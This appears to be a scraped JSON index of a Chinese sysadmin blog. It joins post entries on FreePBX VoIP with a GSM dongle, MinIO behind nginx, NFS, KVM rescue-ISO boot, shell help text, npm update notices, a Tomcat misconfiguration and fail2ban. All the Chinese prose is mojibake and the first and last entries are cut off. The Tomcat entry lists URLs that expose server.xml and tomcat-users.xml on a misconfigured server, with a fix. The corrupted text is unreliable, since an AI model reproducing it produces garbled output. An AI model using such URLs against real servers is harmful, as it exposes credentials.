·å®‰è£…å¥½åï¼Œç³»ç»Ÿå…¶å®æ˜¯dhcpåŠ¨æ€è·å¾—ipçš„ï¼Œè¿›å…¥çœ‹äº†çœ‹ï¼Œæ˜¯Centosï¼Œæˆ‘ä»¬ä¸éœ€è¦dhcpï¼ŒæŠŠIPç»™å›ºå®šæ­»\n1vi /etc/sysconfig/network-scripts/ifcfg-eth0 2 3TYPE=\u0026#34;Ethernet\u0026#34; 4BOOTPROTO=\u0026#34;static\u0026#34; 5IPADDR=10.8.2.60 6NETMASK=255.255.255.0 7GATEWAY=10.8.2.1 8DNS1=114.114.114.114 9DEFROUTE=\u0026#34;yes\u0026#34; 10NAME=\u0026#34;eth0\u0026#34; 11DEVICE=\u0026#34;eth0\u0026#34; 12ONBOOT=\u0026#34;yes\u0026#34; SSHç™»å½•ä¸€ä¸‹æ²¡é—®é¢˜ï¼Œçœ‹åˆ°ç»¿æ¡†å°±okäº†\näºŒã€é…ç½®FreePBXçš„åˆ†æœº æ‰“å¼€ç½‘å€ http://10.8.2.60 , ç™»å½• FreePBX Administration\nç™»ä¸Šå»åæ˜¯è¿™ä¸ªæ ·å­\nä¸Šé¢æˆ‘æ²¡æœ‰å¼€System Firewallï¼Œè¿™ä¸ªçœ‹ä¸ªäººéœ€æ±‚ï¼Œç»å¯¹ä¸è¦åƒå…¬ç½‘å¼€æ”¾80ç«¯å£ï¼Œåªå¼€5060çš„udpå’Œ1000-10004çš„UDPã€‚\nå¼€äº†å…¬ç½‘80çš„è¯ï¼Œé‚£å°±æ˜¯å¦å¤–ä¸€ä¸ªæ‚²ä¼¤çš„æ•…äº‹äº†ï¼ï¼ï¼\nç„¶åå»ºç«‹ç¬¬ä¸€ä¸ªåˆ†æœº888ï¼š\nç›´æ¥åœ¨Applications-\u0026gt;Extensions-\u0026gt;Add new Chan_SIP Extensionæ–°å»ºä¸€ä¸ªåˆ†æœºï¼Œåœ¨Generaltabé¡µé‡Œé¢å¡«å¥½ç¬¬ä¸€ä¸ªSIPè´¦æˆ·çš„ä¿¡æ¯\nGeneralå¡«å†™:\nUser Extension åˆ†æœºå·ä¸º888 Display Name ä¸º ba jieï¼Œæœ€å¥½è‡ªå·±åå­—ï¼Œå¥½åŒºåˆ† Secret æ˜¯å¯†ç ï¼Œè¦å¡«å†™ä¸ªéå¸¸å¤æ‚çš„ï¼Œç»å¯¹ä¸èƒ½ç®€å•ã€‚ ç„¶åæœ€åº•ä¸‹ï¼ŒSubmit æäº¤ä¸€ä¸‹\næœ€åç‚¹å‡»å³ä¸Šè§’çš„Apply Configåº”ç”¨åˆšæ‰çš„é…ç½®ã€‚\nä¸‰ã€é…ç½®dongleæ— çº¿å¡ å†…éƒ¨åˆ†æœºæœ‰äº†ï¼Œæˆ‘ä»¬éœ€è¦é…ç½®å¤–éƒ¨çº¿è·¯\nå»æ·˜å®ä¸Šä¹°ä¸ªdongleå¡ï¼Œæ’åˆ°æœåŠ¡å™¨ä¸Š\nç™»å½•æœåŠ¡å™¨ï¼Œlsusb æŸ¥çœ‹ä¸€ä¸‹usbçš„åœ°å€\nå¾—åˆ° vendori d: 12d1 å’Œ product id: 1436 è¿™ä¸¤ä¸ªå­—ä¸²ï¼Œç¼–è¾‘ä¸€ä¸ªæ–‡ä»¶ usb-attach.xml æ–‡ä»¶ï¼š\n1vi usb-attach.xml 2\u0026lt;hostdev mode=\u0026#39;subsystem\u0026#39; type=\u0026#39;usb\u0026#39;\u0026gt; 3 \u0026lt;source\u0026gt; 4 \u0026lt;vendor id=\u0026#39;0x12d1\u0026#39;/\u0026gt; 5 \u0026lt;product id=\u0026#39;0x1436\u0026#39;/\u0026gt; 6 \u0026lt;/source\u0026gt; 7\u0026lt;/hostdev\u0026gt; ç„¶åæŒ‚æ¥ä¸Š\n1virsh attach-device freepbx-8-2-60 --file usb_huawei.xml --persistent sshç™»å½•è¿›å…¥freepbxï¼ŒlsusbæŸ¥çœ‹ä¸€ä¸‹ï¼ŒåŒæ ·èƒ½çœ‹åˆ°å°±å¯¹äº†\nç„¶åå°±æ˜¯å¤§å·¥ç¨‹äº†ï¼Œç¼–è¯‘é©±åŠ¨ç¨‹åºï¼Œéå¸¸çš„å¤æ‚\nä¸æƒ³ç¼–è¯‘çš„åŠæ³•ï¼š\n1# è§£å‹åŒ… 2unzip -x dongle.zip 3 4cp chan_dongle.so /usr/lib64/asterisk/modules 5chmod 644 /usr/lib64/asterisk/modules/chan_dongle.so å®Œæ•´çš„ç¼–è¯‘çš„æ–¹æ³•ï¼š\n1#è§£å‹åŒ… 2unzip asterisk-chan-dongle-master* 3 4#å®‰è£…å‡†å¤‡åŒ…ç¼–è¯‘ 5yum install automake autotools-dev autoconf 6yum -y install tcl asterisk18-devel make automake binutils 7 8#ç¼–è¯‘å®‰è£… 9cd asterisk-chan-dongle-master/ 10autoupdate 11aclocal 12autoconf 13automake -a 14./bootstrap 15./configure --with-astversion=18.19.0 16make clean 17make 18make install 19 20cd /usr/lib64/asterisk/modules 21ls -lcat|more çœ‹åˆ°æœ‰dongleå­—æ ·å°±okäº†\næ²¡å®Œå‘¢å•Šï¼Œè¿˜éœ€è¦æŠŠé…ç½®æ–‡ä»¶éƒ½å¼„è¿›å»\n1#è§£å‹ 2unzip -x dongle.zip 3 4#install dongles driver 5cd 6echo \u0026#39;KERNEL==\u0026#34;ttyUSB*\u0026#34;, MODE=\u0026#34;0666\u0026#34;, OWNER=\u0026#34;asterisk\u0026#34;, GROUP=\u0026#34;uucp\u0026#34;\u0026#39;\u0026gt;/etc/udev/rules.d/92-dongle.rules 7echo \u0026#39;rungroup = dialout\u0026#39;\u0026gt;\u0026gt;/etc/asterisk/asterisk.conf 8mv dongle.conf /etc/asterisk/dongle.conf 9chown asterisk.asterisk /etc/asterisk/dongle.conf 10chmod 664 /etc/asterisk/dongle.conf 11mv extensions_custom.conf /etc/asterisk/extensions_custom.conf 12chown asterisk.asterisk /etc/asterisk/extensions_custom.conf 13chmod 664 /etc/asterisk/extensions_custom.conf ä¸‹è½½åœ°å€ï¼šdongle.zip ç„¶åæŠŠè™šæœºrebootä¸€ä¸‹ï¼Œè¿›å…¥asteriskæŸ¥çœ‹\n1asterisk -rvvv 2dongle show devices çœ‹åˆ°è‡ªå·±dongleè®¾å¤‡çš„idï¼Œæ˜¯dongle1ï¼Œè®°ä¸‹æ¥ï¼Œå°±ok\nå››ã€é…ç½®FreePBXçš„è¿›å‡ºçº¿è·¯ 1ã€å¢åŠ trunk å›åˆ° FreePBX çš„é…ç½®ç•Œé¢ï¼Œå…ˆé…ä¸€ä¸‹ Trunk çº¿è·¯ï¼Œå¢åŠ ä¸€ä¸ªtrunk:connectivity-\u0026gt;Trunks\nå¢åŠ ä¸€ä¸ª Custom Trunk:\nGeneralå¡«å†™ï¼š\nTrunk Name : china_unicom Outbound CallerID: ç©º ï¼ˆè”é€šæ‰‹æœºå·ï¼Œæœ€å¥½ç©ºï¼Œåé¢æœ‰æç¤ºå¿½ç•¥ï¼Œè¿™ä¸ªæ¥æ‰“çš„æ—¶å€™ä¼šè‡ªåŠ¨æ›¿ä½ å¡«ä¸Šçš„ï¼‰ Maximum Channels: 1 (åªæœ‰ä¸€ä¸ªè”é€šsimå¡ï¼Œå°±æ˜¯1ï¼Œ2ä¸ªå°±æ˜¯2) ç„¶åç‚¹åˆ°custom Settingsï¼Œå¡«å…¥å¦‚ä¸‹å†…å®¹ï¼Œæ³¨æ„ï¼Œæˆ‘çš„è®¾å¤‡æ˜¯dongle1ï¼ŒæŒ‰æŸ¥å‡ºæ¥çš„è®¾å¤‡å¡«å†™å•Šã€‚\n1dongle/dongle1/$OUTNUM$ ç„¶ååŒæ · Submitï¼Œ ç„¶å Apply config. ä¼šæç¤ºCallerIDï¼Œokå¿½ç•¥å³å¯ã€‚\n2ã€é…ç½®æ‹¨å…¥çº¿è·¯Inbound route connectivity-\u0026gt;Inbound Routes\nå¢åŠ ä¸€ä¸ªæ–°çš„Inboundï¼Œåå­—å°±å«gsm_inï¼Œå¯ä»¥éšä¾¿æ”¹ã€‚DIDå’ŒCallerIDéƒ½æ˜¯ANYï¼Œæ„å‘³ç€æ‰€æœ‰è¾¾åˆ°è¿™ä¸ªsimå¡å†…çš„ç”µè¯éƒ½æ¥ä¸‹æ¥ï¼ŒDestinationé€‰æ‹©å’±ä»¬ä¸€å¼€å§‹çš„888åˆ†æœºï¼Œè¿™æ ·å‘¼å…¥çš„ç”µè¯å°±å¯ä»¥è¢«888åˆ†æœºæ¥å¬äº†\nDescription: gsm_in DID Number: ANY CallerID Number: ANY Set Destination: Extensions â€‹ 888 zhang ranrui æœ€ååŒæ · Submit , Apply Configé…ç½®ç”Ÿæ•ˆ\n3ã€é…ç½®æ‹¨å‡ºçº¿è·¯Outbound Routes connectivity-\u0026gt;Outbound Routes\nå¢åŠ ä¸€æ¡æ–°çš„æ‹¨å‡ºçº¿è·¯ï¼Œåå­—å«gsm_outå¥½äº†ï¼Œå¯ä»¥éšä¾¿æ”¹ï¼ŒTrunké€‰å’±ä»¬å»ºç«‹çš„ china_unicom\nRoute Name : gsm_out\nTrunk Sequence for Matched Routes: china_unicom\næ³¨æ„ï¼Œç‚¹åˆ°æ‹¨å·ç›˜ï¼Œè¿˜éœ€è¦é…ä¸€ä¸‹ Dail Patterns\nMatch Pattern: ZX. ZX. çš„æ„æ€æ˜¯æ‹¨å‡ºå»çš„å·ç æœ€å°‘æœ‰3ä¸ªæ•°å­—é‚£ä¹ˆé•¿ï¼Œä¸”ç¬¬ä¸€ä½ä¸æ˜¯0ï¼Œé‚£æ‰‹æœº11ä½ï¼Œèµ·å§‹æ˜¯1å°±æ»¡è¶³äº†ã€‚å¾ˆå¤šæ•™ç¨‹æ•™é…ä¸ª1å’Œ9ä»€ä¹ˆçš„ï¼Œæœ‰æ¯›ç—…å•Šï¼Œæ‹¨å‡ºå»è¿˜è¦åŠ æ‹¨1å’Œ9\næœ€åä»ç„¶æ˜¯Submitï¼ŒApply Configé…ç½®ç”Ÿæ•ˆã€‚\nè¿™æ ·åŸºæœ¬ä¸Šå°±å®Œå·¥äº†\näº”ã€é…ç½®æ‰‹æœºç«¯voipè½¯ä»¶ ç½‘ä¸Šå¤§å¤šæ•°çš„æ•™ç¨‹éƒ½æ˜¯ç”¨zoiperï¼Œè¿™é‡Œå¼ºçƒˆæŒ‡å‡ºï¼Œè¿™ä¸ªè½¯ä»¶æ ¹æœ¬ä¸è¡Œï¼ï¼ï¼\nä¸€æ˜¯zoiperå¿…é¡»è¿è¡Œåœ¨å‰å°æ‰èƒ½æ¥èµ·æ¥æ‰“åˆ°dongleé‡Œçš„ç”µè¯ï¼ŒäºŒæ˜¯zoiperé‡Œgsmå¥½çš„éŸ³é¢‘ç¼–ç å±…ç„¶æ˜¯æ”¶è´¹çš„ã€‚\nç½‘ä¸Šæœäº†åŠå¤©ï¼Œç»ˆäºæ‰¾åˆ°äº†ä¸ªå¥½çš„ï¼ŒPortSIPï¼Œiphoneä¸‹ä¹Ÿæ˜¯å¿…é¡»ç”¨å¤–åŒºidæ‰èƒ½æœåˆ°å¹¶ä¸‹è½½å®‰è£…ã€‚\nè¿™ä¸ªè½¯ä»¶å…¶å®æ˜¯ä¸€å®¶æä¾›pbxæœåŠ¡çš„å…¬å¸æä¾›çš„å®¢æˆ·ç«¯ï¼Œå¯ä»¥æ¥èµ·æ¥æ‰“åˆ°asteriskæ‰‹æœºå¡é‡Œçš„æ‰‹æœºï¼Œè€Œä¸”éŸ³é¢‘ç¼–ç g.729ç­‰ç­‰éƒ½æ˜¯å…è´¹çš„ã€‚\né‚£å¿…é¡»èµä¸€ä¸ªã€‚é«˜çº§è®¾ç½®é‡Œå¼ºåˆ¶å’Œé›†æˆå°±æ˜¯æ¥èµ·æ¥çš„ä¿è¯ï¼Œä¸è¿‡ä¼šå¤§é¢ç§¯è€—ç”µã€‚\néŸ³é¢‘ç¼–ç å™¨ä¸­g.729ä¹Ÿæ˜¯å…è´¹çš„ã€‚æ¯”zoiperè¿˜æ”¶ä½ é’±åšé“å¤šäº†ã€‚\nè®¾ç½®ä¹ŸåŠå…¶ç®€å•ï¼š\nåŸŸåå’Œå‡ºç«™ä»£ç†éƒ½å†™Freepbxæš´éœ²å‡ºå»çš„å…¬ç½‘ipå³å¯\nç”¨æˆ·åå°±æ˜¯pbxæ·»åŠ çš„é‚£ä¸ªåˆ†æœº888ï¼Œå¯†ç å°±æ˜¯secretã€‚\nå…«æˆ’äº²è‡ªåœ¨æ³°å›½æ™®å‰æµ‹è¯•äº†å¾ˆå¤šæ¬¡ï¼Œå®Œèƒœzoiperï¼Œå¼ºçƒˆæ¨èå•Šã€‚\nå…­ã€è·¯ç”±å™¨è®¾ç½® æœ‰å…¬ç½‘è®¾ç½®ï¼Œéœ€è¦åšç«¯å£æ˜ å°„\n1è·¯ç”±å™¨Port 5060 udp --\u0026gt; FreePBX Port 5060 udp 2 3è·¯ç”±å™¨Port 10000-\u0026gt;10004 udp --\u0026gt; FreePBX Port 10000-10004 udp 10000åˆ°10004çš„ç«¯å£æ˜ å°„å‡ºå»æ˜¯å› ä¸ºè¯­éŸ³ä¸€è·¯ï¼Œæ•°æ®ä¸€è·¯ï¼Œæˆ‘ä»¬åªæœ‰ä¸€ä¸ªsimå¡ï¼Œ4è·¯è¶³å¤Ÿäº†ã€‚\nä¸ƒã€è¡¥å…… åœ¨freepbxä¸Šé¢å‘é€çŸ­ä¿¡çš„å‘½ä»¤\n1asterisk -rx \u0026#34;dongle sms dongle1 +8613000000000 ä¿¡æ¯æµ‹è¯•\u0026#34; ","date":"2024-01-05","img":"","permalink":"https://rendoumi.com/posts/20240105-voip_iphone/","series":["Manual"],"tags":null,"title":"æœ€æ–°ç‰ˆå‡ºå›½æ—…è¡Œå®‰è£…ä¸€ä¸ªFreePBXçš„voipç”µè¯è‡ªç”¨"},{"categories":null,"content":"åŒäº‹æœ‰ä¸ªéœ€æ±‚ï¼Œæƒ³å¼€æ”¾ä¸ªåŸŸåï¼Œç»™åˆ«çš„åŒäº‹ä»¬ä¸‹è½½æ–‡ä»¶ç”¨ã€‚\nè¿™ä¸ªå…¶å®å¾ˆå»ºå•ï¼Œé—®é¢˜å°±æ˜¯æ–‡ä»¶æ€ä¹ˆæ”¾ä¸Šå»ï¼Œsftpã€ftpä»€ä¹ˆçš„éƒ½éœ€è¦æ­ä¸ªæœåŠ¡å™¨ï¼Œå…¶å®æœ€ç®€å•åº”è¯¥æ˜¯webdavï¼Œä½†æ˜¯æ”¾å…¬ç½‘åˆä¸å¤ªå®‰å…¨ã€‚\næœ¬æ¥è€ƒè™‘æ˜¯ç”¨ oss çš„æ¡¶ï¼Œå‰é¢ç›´æ¥å¥—ä¸ªCDNï¼Œä½†æ˜¯å¦‚æœæ¡¶æ–‡ä»¶æ³„éœ²è¢«ç–¯ç‹‚ä¸‹è½½ï¼Œä¹Ÿä¼šä»˜å‡ºé“¶ä¸¤ã€‚\næœ€ååšæ³•æ˜¯ç”¨ Minio å¼„ä¸€ä¸ªæ¨¡æ‹Ÿçš„æ¡¶ç¯å¢ƒï¼Œå‰é¢é…ç½®ä¸Š Nginxï¼Œå¸¦å®½é™åˆ¶åˆ°1Mï¼Œè¿™æ ·å°±æ— æ‰€è°“äº†ã€‚åŒäº‹ç”¨å¦ä¸€å°æœºå™¨æ¨¡æ‹ŸS3çš„APIå¾€ä¸Šé¢æ”¾æ–‡ä»¶ä¾›ä¸‹è½½ã€‚\nä¸€ã€minioçš„å®‰è£…\nä¸‹è½½äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œç®€å•ç²—æš´å¯åŠ¨ï¼š\n1#!/bin/bash 2nohup /app/minio/minio server --address \u0026#39;0.0.0.0:9000\u0026#39; --console-address \u0026#39;0.0.0.0:9001\u0026#39; /app/bucket \u0026gt; /app/minio/minio.log 2\u0026gt;\u0026amp;1 \u0026amp; è¿™æ ·å°±å¯åŠ¨äº†ï¼Œç„¶åç½‘é¡µæ‰“å¼€ http://10.10.247.211:9000 ï¼Œå°±å¯ä»¥çœ‹åˆ°ç™»å½•ç•Œé¢äº†\nç™»å½•åï¼Œæˆ‘ä»¬å…ˆå»ºç«‹ä¸€ä¸ªBucketï¼Œå°±å«åšpubæ¡¶ï¼ŒæŠŠpubæ¡¶çš„ç­–ç•¥æ”¹æˆpublicï¼Œè¿™æ ·nginxä»£ç†çš„æ—¶å€™æ‰èƒ½ç›´æ¥è®¿é—®åˆ°\nç„¶åæˆ‘ä»¬ä¸Šä¼ ä¸ªå›¾ç‰‡ï¼ŒBOMS3.0.pngï¼Œç„¶åå»/app/bucketç›®å½•ä¸‹çœ‹çœ‹\nç»“æœå‘ç°BOMS3.0.pngå±…ç„¶æ˜¯ä¸ªç›®å½•ï¼Œè¿›å»ç»§ç»­çœ‹\nmetaä¿¡æ¯å’Œè‹¥å¹²çš„partï¼Œçœ‹æ¥è¿™æ˜¯ä¸ºå¤šç‰ˆæœ¬å‡†å¤‡çš„ï¼Œè¿™å°±æ˜¯ä¸ºä»€ä¹ˆè¦ç­–ç•¥æ˜¯publicçš„åŸå› ï¼Œä¸æ˜¯å°±æ— æ³•ä»9000è®¿é—®ã€‚\näºŒã€å®‰è£…é…ç½®nginx\n1server { 2 listen 80; 3 listen [::]:80; 4 server_name supervisor-task.ddky.com; 5 6 location / { 7 return 301 https://supervisor-task.ddky.com$request_uri; 8 } 9} 10 11server { 12 listen 443 ssl; 13 server_name supervisor_task.ddky.com; 14 15 ssl_certificate /etc/nginx/cert/_.ddky.com.crt; 16 ssl_certificate_key /etc/nginx/cert/_.ddky.com.key; 17 ssl_session_timeout 5m; 18 19 location / { 20 rewrite ^/$ /pub/index.html break; 21 proxy_pass http://10.10.247.211:9000/pub/; 22 proxy_redirect off; 23 } 24 25 access_log /app/logs/access.log ; 26 error_log /app/logs/error.log; 27 28} ä¸»è¦å°±æ˜¯è¦é…ç½®ä»£ç†ï¼Œä»£ç†åˆ°minioçš„9000ç«¯å£\nè¿™æ ·å°±å¥½äº†ã€‚\n","date":"2023-12-28","img":"","permalink":"https://rendoumi.com/posts/20231228-minio_nginx/","series":null,"tags":null,"title":"é…ç½®Minio+nginxçš„ä»£ç†æ¥å¼€æ”¾æ¡¶å†…å†…å®¹"},{"categories":null,"content":"NFSçš„SERVERåˆ†ä¸¤éƒ¨åˆ†ï¼š 1ã€RPC ä¸»ç¨‹åºï¼šrpcbind NFS æœ¬è´¨æ˜¯ä¸€ä¸ª RPC æœåŠ¡ï¼Œè€Œè¦å¯åŠ¨ä»»ä½•ä¸€ä¸ª RPC æœåŠ¡ä¹‹å‰ï¼Œéƒ½éœ€è¦åšå¥½ port çš„å¯¹åº” (mapping) çš„å·¥ä½œæ‰è¡Œï¼Œè¿™ä¸ªå·¥ä½œå…¶å®å°±æ˜¯ã€ rpcbind ã€è¿™ä¸ªæœåŠ¡æ‰€è´Ÿè´£çš„ï¼ä¹Ÿå°±æ˜¯è¯´ï¼Œ åœ¨å¯åŠ¨ä»»ä½•ä¸€ä¸ª RPC æœåŠ¡ä¹‹å‰ï¼Œæˆ‘ä»¬éƒ½éœ€è¦å¯åŠ¨ rpcbind æ‰è¡Œï¼ (åœ¨ CentOS 5.x ä»¥å‰è¿™ä¸ªè½¯ä»¶ç§°ä¸º portmapï¼Œåœ¨ CentOS 6.x ä¹‹åæ‰ç§°ä¸º rpcbind çš„ï¼)\n2ã€NFS ä¸»ç¨‹åºï¼šnfs-utils å°±æ˜¯æä¾› rpc.nfsd åŠ rpc.mountd è¿™ä¸¤ä¸ª NFS daemons ä¸å…¶ä»–ç›¸å…³ documents ä¸è¯´æ˜æ–‡ä»¶ã€æ‰§è¡Œæ–‡ä»¶ç­‰çš„è½¯ä»¶ï¼è¿™ä¸ªå°±æ˜¯ NFS æœåŠ¡æ‰€éœ€è¦çš„ä¸»è¦è½¯ä»¶ï¼\nå®‰è£…æœåŠ¡ç«¯NFS Server 1yum install nfs-utils rpcbind -y 2sudo apt install nfs-kernel-server å®¢æˆ·ç«¯ä¸æä¾›æœåŠ¡ï¼Œæ‰€ä»¥ä¸ç”¨è£…rpcbind 1yum install nfs-utils 2sudo apt install nfs-common å°†NFSå’ŒrpcbindåŠ å…¥å¼€æœºå¯åŠ¨ 1systemctl enable --now rpcbind 2systemctl enable --now nfs å®¢æˆ·ç«¯ä¸ç”¨å¯ç”¨ä»»ä½•æœåŠ¡ æœåŠ¡ç«¯æ£€æŸ¥æ˜¯å¦å®‰è£…nfsï¼š 1rpm -qa | grep nfsä¸ rpm -qa | grep rpcbindå³å¯ åœæ­¢æœåŠ¡ç«¯çš„nfs serverçš„æ–¹æ³•ï¼š 1systemctl stop nfs 2systemctl stop rpcbind é…ç½®å…±äº«ç›®å½• åœ¨æœåŠ¡ç«¯é…ç½®ä¸€ä¸ªå…±äº«ç›®å½•\n1$ mkdir /data 2$ chmod 755 /data æ ¹æ®è¿™ä¸ªç›®å½•ï¼Œç›¸åº”é…ç½®å¯¼å‡ºç›®å½•\n1$ vi /etc/exports æ·»åŠ å¦‚ä¸‹é…ç½® /data/ 192.168.0.0/24(rw,sync,no_root_squash,no_all_squash)\n1/data: å…±äº«ç›®å½•ä½ç½®ã€‚ 2192.168.0.0/24: å®¢æˆ·ç«¯ IP èŒƒå›´ï¼Œ* ä»£è¡¨æ‰€æœ‰ï¼Œå³æ²¡æœ‰é™åˆ¶ã€‚ 3rw: æƒé™è®¾ç½®ï¼Œå¯è¯»å¯å†™ã€‚ 4sync: åŒæ­¥å…±äº«ç›®å½•ã€‚ 5no_root_squash: å¯ä»¥ä½¿ç”¨ root æˆæƒã€‚ 6no_all_squash: å¯ä»¥ä½¿ç”¨æ™®é€šç”¨æˆ·æˆæƒã€‚ åœ¨å®¢æˆ·ç«¯ä¸ŠæŸ¥è¯¢serverï¼š 1showmount -e 10.0.6.10 2mount -t nfs 192.168.0.1:/data /mnt/nfs å–æ¶ˆæŒ‚è½½ 1umount /app/file 2fuser /app/file 3umount -d -l /app/file 4fuser -m -v -i -k /app/file ","date":"2023-12-28","img":"","permalink":"https://rendoumi.com/posts/20231228-nfs_detail/","series":null,"tags":null,"title":"NFSçš„è¯¦ç»†è§£é‡Š"},{"categories":null,"content":"Kvmè™šæ‹ŸæœºæŒ‚è½½ä¸´æ—¶æ€¥æ•‘isoå¯åŠ¨çš„æ–¹æ³•ï¼š é¦–å…ˆå»åˆ°å®¿ä¸»æœº\nç¼–è¾‘è™šæœºæ–‡ä»¶virsh edit vis-18-32-6\n1 \u0026lt;disk type=\u0026#39;file\u0026#39; device=\u0026#39;cdrom\u0026#39;\u0026gt; 2 \u0026lt;driver name=\u0026#39;qemu\u0026#39; type=\u0026#39;raw\u0026#39;/\u0026gt; 3 \u0026lt;target dev=\u0026#39;hda\u0026#39; bus=\u0026#39;ide\u0026#39;/\u0026gt; 4 \u0026lt;readonly/\u0026gt; 5 \u0026lt;address type=\u0026#39;drive\u0026#39; controller=\u0026#39;0\u0026#39; bus=\u0026#39;0\u0026#39; target=\u0026#39;0\u0026#39; unit=\u0026#39;0\u0026#39;/\u0026gt; 6 \u0026lt;/disk\u0026gt; åœ¨targetä¸‹é¢å¢åŠ ä¸€è¡Œsourceï¼š\n1 \u0026lt;disk type=\u0026#39;file\u0026#39; device=\u0026#39;cdrom\u0026#39;\u0026gt; 2 \u0026lt;driver name=\u0026#39;qemu\u0026#39; type=\u0026#39;raw\u0026#39;/\u0026gt; 3 \u0026lt;target dev=\u0026#39;hda\u0026#39; bus=\u0026#39;ide\u0026#39;/\u0026gt; 4\t\u0026lt;source file=\u0026#34;/export/kvm/systemrescuecd-x86-5.2.2.iso\u0026#34;/\u0026gt; 5 \u0026lt;readonly/\u0026gt; 6 \u0026lt;address type=\u0026#39;drive\u0026#39; controller=\u0026#39;0\u0026#39; bus=\u0026#39;0\u0026#39; target=\u0026#39;0\u0026#39; unit=\u0026#39;0\u0026#39;/\u0026gt; 7 \u0026lt;/disk\u0026gt; å†ä¿®æ”¹bootä¸ºcdromï¼Œæ”¹å›å»åˆ™æ˜¯hd\n1 \u0026lt;os\u0026gt; 2 \u0026lt;type arch=\u0026#39;x86_64\u0026#39; machine=\u0026#39;pc-i440fx-rhel7.0.0\u0026#39;\u0026gt;hvm\u0026lt;/type\u0026gt; 3 \u0026lt;boot dev=\u0026#39;cdrom\u0026#39;/\u0026gt; 4 \u0026lt;/os\u0026gt; ç„¶åå¯åŠ¨è™šæœºå°±å¯ä»¥äº†ã€‚\n","date":"2023-12-28","img":"","permalink":"https://rendoumi.com/posts/20231228-kvm_isoboot/","series":null,"tags":null,"title":"Kvmè™šæ‹ŸæœºæŒ‚è½½ä¸´æ—¶æ€¥æ•‘isoå¯åŠ¨çš„æ–¹æ³•"},{"categories":null,"content":"Shellè„šæœ¬å¥½çš„å¸®åŠ©ä¿¡æ¯çš„ä¾‹å­ ä¸€ä¸ªå¥½çš„è„šæœ¬ï¼Œå¿…é¡»æœ‰å¥½çš„å¸®åŠ©ä¿¡æ¯\nç»™ä¸€ä¸ªæ¯”è¾ƒç®€æ´çš„ä¾‹å­\n#!/bin/bash\r###\r### my-script â€” does one thing well\r###\r### Usage:\r### my-script \u0026lt;input\u0026gt; \u0026lt;output\u0026gt;\r###\r### Options:\r### \u0026lt;input\u0026gt; Input file to read.\r### \u0026lt;output\u0026gt; Output file to write. Use '-' for stdout.\r### -h Show this message.\rhelp() {\rawk -F'### ' '/^###/ { print $2 }' \u0026quot;$0\u0026quot;\r}\rif [[ $# == 0 ]] || [[ \u0026quot;$1\u0026quot; == \u0026quot;-h\u0026quot; ]]; then\rhelp\rexit 1\rfi\recho Hello World\rä»¥å‰ä¸‘é™‹çš„ç”¨æ³•çœŸæ˜¯æ²¡æ³•çœ‹ï¼ï¼ï¼\n","date":"2023-12-28","img":"","permalink":"https://rendoumi.com/posts/20231228-shell_prompt/","series":null,"tags":null,"title":"Shellè„šæœ¬çš„ä¸€ä¸ªå¥½çš„å¸®åŠ©ä¿¡æ¯"},{"categories":null,"content":"Nodejsç¦æ­¢åå°å·å·å‡çº§ å»åˆ°172.18.31.2ä¸Šï¼Œä¼šçœ‹åˆ°å¾ˆå¤šnodeè¿›ç¨‹\næœ‰ç—…å™»ï¼Œç³»ç»Ÿéƒ½æ²¡æœ‰è¿è¡Œnodeç¨‹åºã€‚å”¯ä¸€çš„ç¨‹åºæ˜¯nci-ansible-ui-quick-setupï¼Œåœ¨/export/serverä¸‹ï¼Œè¿˜æ²¡æœ‰è¿è¡Œï¼Œå‡çº§ä¸ªèŒ„å­å™»ã€‚\nå…¨æ€æ‰ï¼Œç„¶åå…¨å±€ç¦æ­¢å‡çº§å³å¯\n1npm config set update-notifier false --global ç¬¬ä¸€æ¬¡è¿è¡Œä¼šæœ‰ä¸ªæç¤ºï¼Œå†è¿è¡Œå°±æ²¡æœ‰äº†ã€‚ ","date":"2023-12-28","img":"","permalink":"https://rendoumi.com/posts/20231228-nodejs_noupgrade/","series":null,"tags":null,"title":"Nodejsç¦æ­¢åå°å·å·å‡çº§"},{"categories":null,"content":"Tomcaté…ç½®ä¸å½“å¯¼è‡´æ–‡ä»¶æ³„éœ² è¯´æ˜ï¼šTomcatç”±äºé…ç½®ä¸å½“ä¼šå¯¼è‡´tomcat/conf log webapps work temp bin libç­‰ä¿¡æ¯æš´éœ²åœ¨æ¸¸è§ˆå™¨ä¸­ ä¾‹å¦‚ï¼š\n1http://192.168.89.38:8080/conf/catalina.policy 2http://192.168.89.38:8080/conf/catalina.properties 3http://192.168.89.38:8080/conf/context.xml 4http://192.168.89.38:8080/conf/logging.properties 5http://192.168.89.38:8080/conf/server.xml 6http://192.168.89.38:8080/conf/tomcat-users.xml 7http://192.168.89.38:8080/conf/web.xml ä¿®å¤æ–¹æ³•ï¼š\n1å°† /export/servers/tomcat ä¸‹çš„ server.xml 2 3\u0026lt;Host name=\u0026#34;localhost\u0026#34; appBase=\u0026#34;\u0026#34; æ”¹æˆ 4\u0026lt;Host name=\u0026#34;localhost\u0026#34; appBase=\u0026#34;webapps\u0026#34; 5 6appBaseåƒä¸‡ä¸èƒ½ä¸ºç©º ä¿®æ”¹å®Œåé‡å¯ç”Ÿæ•ˆ\n","date":"2023-12-28","img":"","permalink":"https://rendoumi.com/posts/20231228-tomcat_config/","series":null,"tags":null,"title":"Tomcaté…ç½®ä¸å½“å¯¼è‡´æ–‡ä»¶æ³„éœ²"},{"categories":null,"content":"ç”¨fail2banç®€ç®€å•å•å°æ‰sshç«¯å£çš„è¯•æ¢ æœ‰äººä¸åœè¯•æ¢ç™»å½•22ç«¯å£çš„opensshæœåŠ¡ï¼Œipé‡å¾ˆå¤§çš„è¯ï¼Œæ¯”å¦‚1000å¤šipè®ºç•ªæ¥ï¼Œä¼šå¯¼è‡´æœåŠ¡çš„Loadavgå‡é«˜åˆ°7å·¦å³ï¼Œç³»ç»Ÿè¿›ç¨‹å†…sshè¾¾åˆ°1000å¤šï¼Œå¾ˆå›°æ‰°\nå¦‚æœæ”¹æ‰sshdçš„ç¼ºçœç«¯å£22ï¼Œé‚£ä¹ˆscpä»¥åŠsftpçš„æ—¶å€™ä¼šå¸¦æ¥å¾ˆå¤§éº»çƒ¦\nè¿™ç§æƒ…å†µå°±è£…ä¸ªfail2banå°±å¥½ï¼Œæ³¨æ„ï¼ŒCentos 7ç°åœ¨ç”¨çš„æ˜¯fiewalldï¼Œæ‰€ä»¥fail2banå¯ä»¥ç”¨ufwæˆ–è€…iptablesï¼Œå»ºè®®ç”¨iptablesï¼Œæ¯”è¾ƒå®¹æ˜“çœ‹\n1#å®‰è£… 2yum install -y epel-release 3yum install -y fail2ban 